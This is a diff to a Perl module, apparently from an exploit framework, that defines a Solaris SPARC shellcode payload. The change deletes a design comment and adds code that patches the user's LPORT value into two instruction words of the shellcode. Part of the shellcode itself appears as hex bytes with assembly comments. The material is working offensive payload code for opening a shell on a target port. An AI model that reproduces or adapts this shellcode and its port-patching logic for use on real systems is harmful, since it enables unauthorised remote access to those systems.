@@ -24,9 +24,7 @@ sub new {
     return($self);
 }
 
-# Could also override Build with a return($self->BuildSolaris(foo));
-# this is cleaner, maybe, still allows dynamic building of payload with
-# evn available.
+
 sub SolarisPayload {
     my $self = shift;
     my $hash = {
@@ -66,6 +64,21 @@ sub SolarisPayload {
             "\x9f\xc3\xbf\xe8".     # jmpl         %sp - 24, %o7
             "\xac\x1d\x80\x16",     # xor          %l6, %l6,%l6
     };
+    
+    my $lport  = unpack('N', pack('nn', 0x3302, $self->GetVar('LPORT') ^ 4095));
+    
+    # Extract
+    my $hiData = unpack('N', substr($hash->{'Payload'}, 28, 4));
+    my $loData = unpack('N', substr($hash->{'Payload'}, 32, 4));
+
+    # Patch
+    $hiData = (($hiData >> 22) << 22) + ($lport >> 10);
+    $loData = (($loData >> 10) << 10) + (($lport << 22) >> 22);
+
+    # Replace
+    substr($hash->{'Payload'}, 28, 4, pack('N', $hiData));
+    substr($hash->{'Payload'}, 32, 4, pack('N', $loData));
+    
     return($hash);
 }
 
